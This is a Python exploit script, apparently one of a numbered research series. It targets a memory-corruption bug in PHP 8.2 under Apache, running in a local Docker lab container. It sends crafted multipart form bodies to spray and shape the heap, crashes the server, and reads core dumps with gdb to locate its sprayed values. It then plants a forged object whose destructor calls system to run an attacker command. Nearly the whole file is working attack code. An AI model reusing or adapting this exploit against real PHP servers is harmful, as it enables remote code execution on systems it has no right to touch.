#!/usr/bin/env python3
"""oom126: BODY-SEED ARM — the stale arData tail = freed raw-body read-buffer
realloc copies (K-sea proof), fully attacker-controlled incl. NULs.

Chain: warm shape (payload68 K1S, H-SHAPE law) -> round 1: SIG8-sea body
(first 20 parts = 60KB SIG8 values saturating the freed read-buffer copies;
parts tagged MAGIC+i) -> crash -> core -> tag map -> part13 value address
A13 -> legal B = A13+OFF -> round 2: identical body sizes, parts 0..19 =
B||B*3800 (sea), part13 = block at OFF -> tail rdi=B -> rc 1->0 ->
rc_dtor -> store_del -> free_obj(B)=system -> /tmp/x.

Win-check law (oom125 bug): NEVER substring-match /tmp/x; use
`test -f` + marker echo.
"""
import re, struct, subprocess, time, urllib.request, urllib.error
import payload68 as P

HOST = "http://127.0.0.1:8081"
STOCK_MD5 = "ce1f3c48ba22f8f17834ac791aead613"
ZIF = 0x39B8A0
CMD = b"whoami>/tmp/x"
SIG8 = struct.pack("<Q", 0x51E2C0DE51E2C0DE)
MAGIC = 0xC0DEBA5E
NV = 190                      # tag16 + 190*16 = 3056B values
VLEN = 16 + NV * 16
K1 = 4200
NSEEDPARTS = 20               # 20 x 60KB = 1.2MB sea at body start
SEEDVAL = SIG8 * 3800         # 60800B
CORE = "/tmp/core.126"

def get(url, timeout=90):
    try:
        return 200, urllib.request.urlopen(url, timeout=timeout).read(200000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(200000).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % type(e).__name__

def sh(cmd, timeout=120):
    r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c", cmd],
                       capture_output=True, timeout=timeout)
    return (r.stdout + r.stderr).decode("latin1").strip()

def x_state():
    r = sh("test -f /tmp/x && echo X_EXISTS:$(cat /tmp/x) || echo NO_X")
    return r.strip()

def segv_count():
    r = subprocess.run(["docker", "logs", "php_vuln"], capture_output=True, timeout=120)
    return len(re.findall(r"exit signal Segmentation", (r.stdout + r.stderr).decode("latin1", "replace")))

def recreate():
    subprocess.run(["docker", "rm", "-f", "php_vuln"], capture_output=True)
    subprocess.run(["docker", "run", "-d", "--name", "php_vuln", "-p", "8081:80",
                    "-v", "/tmp/phplab:/var/www/html",
                    "-v", "/tmp/phplab/oom1worker.conf:/etc/apache2/conf-enabled/oom1worker.conf",
                    "-v", "/tmp/phplab/30-oomlab.ini:/usr/local/etc/php/conf.d/30-oomlab.ini",
                    "--cap-add", "SYS_PTRACE", "--ulimit", "core=-1",
                    "php:8.2.34-apache"], capture_output=True)
    for _ in range(40):
        time.sleep(1.5)
        c, _o = get(HOST + "/oom_sapi.php", timeout=8)
        if c == 200:
            return True
    return False

def post_mod(body, timeout=300):
    req = urllib.request.Request(HOST + "/oom_mod.php", data=body,
                                 headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        return 200, urllib.request.urlopen(req, timeout=timeout).read(300).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(300).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % type(e).__name__

def base_now():
    c, o = get(HOST + "/oom_probe.php?libphp=1")
    m = re.search(r"libphp=0x([0-9a-f]+)", o)
    return int(m.group(1), 16) if m else None

def cell_of(addr):
    return struct.pack("<Q", addr) * 2

def tag16(i):
    return struct.pack("<QQ", MAGIC + i, MAGIC + i)

def value_3056(i):
    return tag16(i) + SIG8 * NV

def build_body(sea_tile, block_part=None, OFF=0, B=0):
    """First NSEEDPARTS parts = sea_tile*3800; rest tagged. Sizes constant."""
    ps = []
    sea = sea_tile * 3800
    for i in range(K1):
        if i < NSEEDPARTS:
            v = sea
        else:
            v = bytearray(value_3056(i))
            if block_part is not None and i == block_part:
                st = struct.pack_into
                st("<II", v, OFF + 0x00, 1, 0x108)
                st("<II", v, OFF + 0x08, 1, 0)
                st("<Q", v, OFF + 0x10, 0)
                st("<Q", v, OFF + 0x18, B + 0x68)
                st("<I", v, OFF + 0x2C, 1)
                st("<Q", v, OFF + 0x50, B + 0x90)
                v[OFF + 0x58] = 6
                st("<I", v, OFF + 0x5C, 0x106)
                st("<Q", v, OFF + 0x68, 0)
                st("<Q", v, OFF + 0x70, BASE + ZIF)
                st("<IIQI", v, OFF + 0x90, 1, 0x106, 0, len(CMD))
                v[OFF + 0xA8: OFF + 0xA8 + len(CMD) + 1] = CMD + b"\x00"
                for s in range(0, len(v), 16):
                    if not (OFF <= s < OFF + 0xB8):
                        v[s:s + 16] = cell_of(B)
                v = bytes(v)
        ps.append(b'--BOUND\r\nContent-Disposition: form-data; name="p%08d"[x]"\r\n\r\n' % i
                  + v + b"\r\n")
    ps += [P.poison_part(n, 5000000 + n * P.CELLS) for n in range(P.PREP)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)

def fire(tag, body, tries=2):
    for t in range(tries):
        sh("rm -f /tmp/core /tmp/core.used")
        n0 = segv_count()
        c, r = post_mod(body)
        crashed = False
        for _ in range(10):
            time.sleep(2)
            if segv_count() > n0 or sh("test -f /tmp/core && echo y") == "y":
                crashed = True
                break
        print("%s try%d: http=%s segv+%d core=%s"
              % (tag, t, c, segv_count() - n0,
                 sh("test -f /tmp/core && echo y") == "y"), flush=True)
        if crashed:
            return True, c, r
    return False, c, r

def pull_core(dst):
    subprocess.run(["docker", "cp", "php_vuln:/tmp/core", "/tmp/core.tmp"], capture_output=True)
    subprocess.run(["docker", "cp", "/tmp/core.tmp", "phpbuild:" + dst], capture_output=True)
    subprocess.run(["docker", "cp", "phpbuild:" + dst, "/tmp/scan_core"], capture_output=True)

def core_tags():
    import mmap
    f = open("/tmp/scan_core", "rb")
    mm = mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ)
    e_phoff = struct.unpack_from("<Q", mm, 0x20)[0]
    e_phentsize, e_phnum = struct.unpack_from("<HH", mm, 0x36)
    m4 = struct.pack("<I", MAGIC)
    out = {}
    for i in range(e_phnum):
        off = e_phoff + i * e_phentsize
        p_type = struct.unpack_from("<I", mm, off)[0]
        p_offset, p_vaddr, _pa, p_filesz = struct.unpack_from("<QQQQ", mm, off + 8)
        if p_type != 1 or p_filesz < 0x10000:
            continue
        data = mm[off:off + p_filesz]
        start = 0
        while True:
            j = data.find(m4, start)
            if j < 0:
                break
            idx = struct.unpack_from("<I", data, j + 4)[0]
            if idx < K1 and struct.unpack_from("<I", data, j + 8)[0] == MAGIC + idx:
                out.setdefault(idx, p_vaddr + j)
            start = j + 1
    mm.close(); f.close()
    return out

def core_rdi(corepath):
    subprocess.run(["docker", "exec", "phpbuild", "sh", "-c",
                    'printf "set pagination off\\nset confirm off\\ninfo registers rdi rbx rip\\nquit\\n" > /tmp/g126.gdb'],
                    capture_output=True)
    r = subprocess.run(["docker", "exec", "phpbuild", "sh", "-c",
                        "gdb -q -batch -x /tmp/g126.gdb /tmp/libphp.stock.so %s 2>&1 | grep -E '^rdi|^rbx|^rip'" % corepath],
                       capture_output=True, timeout=240)
    return r.stdout.decode("latin1").strip()

print("=== oom126: body-seed arm ===", flush=True)
assert recreate(), "recreate failed"
md5 = sh("md5sum /usr/lib/apache2/modules/libphp.so | cut -d' ' -f1")
assert md5 == STOCK_MD5, "not stock: " + md5
print("md5 ok", flush=True)

# ---- H-SHAPE: warm sequence (proven) ----
for k1 in P.K1S[:-1]:
    post_mod(P.build_attack(k1, 5000000))
print("shaped segv=%d" % segv_count(), flush=True)
BASE = base_now()
print("base=0x%x" % BASE, flush=True)
print("pre-round x: %s" % x_state(), flush=True)

B = None; OFF = None; part = None
for rnd in range(1, 4):
    print("--- round %d (B=%s part=%s OFF=%s) ---" % (rnd, B and hex(B), part, OFF), flush=True)
    sea = cell_of(B) if B else SIG8
    body = build_body(sea, block_part=part, OFF=OFF or 0, B=B or 0)
    print("body %.2f MB" % (len(body) / 1048576.0), flush=True)
    crashed, c, r = fire("r%d" % rnd, body)
    xs = x_state()
    print("r%d x: %s" % (rnd, xs), flush=True)
    if xs.startswith("X_EXISTS"):
        print("!!! /tmp/x EXISTS - CAMPAIGN WON (round %d) content=%s" % (rnd, xs), flush=True)
        break
    if not crashed:
        print("r%d no crash - reshaping", flush=True)
        for k1 in P.K1S[-3:]:
            post_mod(P.build_attack(k1, 5000000))
        continue
    pull_core("%s_r%d" % (CORE, rnd))
    print("gdb: " + core_rdi("%s_r%d" % (CORE, rnd)), flush=True)
    tags = core_tags()
    print("tags: %d parts mapped" % len(tags), flush=True)
    if part is None:
        if 13 in tags:
            A13 = tags[13]
            print("A13(part13 value start)=0x%x" % A13, flush=True)
            done = False
            for o in range(8, VLEN - 0xB8, 16):
                cand = A13 + o
                if cand & 0xF == 8 and (cand >> 8) & 1 == 1 and (cand >> 9) & 1 == 0:
                    B, OFF, part = cand, o, 13
                    print("ARM: part=13 OFF=0x%x B=0x%x" % (OFF, B), flush=True)
                    done = True
                    break
            if not done:
                print("no legal B from A13 - widening to any tagged part", flush=True)
                for idx in sorted(tags):
                    for o in range(8, VLEN - 0xB8, 16):
                        cand = tags[idx] + o
                        if cand & 0xF == 8 and (cand >> 8) & 1 == 1 and (cand >> 9) & 1 == 0:
                            B, OFF, part = cand, o, idx
                            print("ARM alt: part=%d OFF=0x%x B=0x%x" % (idx, OFF, B), flush=True)
                            done = True
                            break
                    if done:
                        break
        else:
            print("part13 tag missing; have %s" % sorted(tags)[:10], flush=True)
    else:
        a = tags.get(part)
        print("part %d now 0x%s (B=0x%x) %s" % (part, a and hex(a), B,
              "MATCH" if a and a + OFF == B else "DRIFT"), flush=True)
        if a and a + OFF != B:
            B = None
            for o in range(8, VLEN - 0xB8, 16):
                cand = a + o
                if cand & 0xF == 8 and (cand >> 8) & 1 == 1 and (cand >> 9) & 1 == 0:
                    B, OFF = cand, o
                    break
            print("re-ARM: OFF=0x%x B=0x%s" % (OFF, B and hex(B)), flush=True)

print("final x: %s" % x_state(), flush=True)
print("=== done ===", flush=True)
